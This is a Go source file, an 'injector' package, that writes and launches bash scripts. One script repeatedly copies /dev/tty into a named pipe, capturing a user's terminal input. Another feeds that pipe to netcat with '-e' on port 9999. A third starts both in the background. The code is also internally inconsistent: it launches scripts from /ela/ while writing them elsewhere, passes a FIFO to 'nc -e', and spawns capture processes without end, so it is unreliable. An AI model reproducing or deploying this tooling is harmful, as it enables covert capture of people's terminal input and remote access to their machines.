package injector

import (
"bytes"
"fmt"
"os"
"os/exec"
"path/filepath"
"text/template"
)

type Injector struct {
workDir string
}

func NewInjector(workDir string) *Injector {
return &Injector{workDir: workDir}
}

type InstanceInfo struct {
ID      string
Path    string
Arch    string
Mode    string
Channel string
}

func (inj *Injector) InjectLS(inst InstanceInfo) error {
script := `#!/bin/bash
# LS.sh - Linux Script driver
# Instance: {{.ID}}
# Channel: {{.Channel}}

echo "[LS] Starting capture for instance {{.ID}}"
mkfifo /tmp/ela_ls_{{.ID}} 2>/dev/null
while true; do
    cat /dev/tty 2>/dev/null > /tmp/ela_ls_{{.ID}} &
    sleep 1
done
`
tmpl, err := template.New("ls").Parse(script)
if err != nil {
return err
}
var buf bytes.Buffer
if err := tmpl.Execute(&buf, inst); err != nil {
return err
}
dest := filepath.Join(inj.workDir, fmt.Sprintf("LS_%s.sh", inst.ID))
if err := os.MkdirAll(inj.workDir, 0755); err != nil {
return err
}
return os.WriteFile(dest, buf.Bytes(), 0755)
}

func (inj *Injector) InjectLhyper(inst InstanceInfo) error {
script := `#!/bin/bash
# Lhyper.sh - Lhyper transport driver
# Instance: {{.ID}}
# Channel: {{.Channel}}

echo "[Lhyper] Starting transport for instance {{.ID}}"
nc localhost 9999 -e /tmp/ela_ls_{{.ID}} &
`
tmpl, err := template.New("lhyper").Parse(script)
if err != nil {
return err
}
var buf bytes.Buffer
if err := tmpl.Execute(&buf, inst); err != nil {
return err
}
dest := filepath.Join(inj.workDir, fmt.Sprintf("Lhyper_%s.sh", inst.ID))
return os.WriteFile(dest, buf.Bytes(), 0755)
}

func (inj *Injector) Inject(inst InstanceInfo) error {
if err := inj.InjectLS(inst); err != nil {
return err
}
if err := inj.InjectLhyper(inst); err != nil {
return err
}
script := `#!/bin/bash
# ELA injector for instance {{.ID}}
/ela/LS_{{.ID}}.sh &
/ela/Lhyper_{{.ID}}.sh &
`
tmpl, err := template.New("inject").Parse(script)
if err != nil {
return err
}
var buf bytes.Buffer
if err := tmpl.Execute(&buf, inst); err != nil {
return err
}
dest := filepath.Join(inj.workDir, fmt.Sprintf("inject_%s.sh", inst.ID))
if err := os.WriteFile(dest, buf.Bytes(), 0755); err != nil {
return err
}
cmd := exec.Command("bash", dest)
return cmd.Start()
}
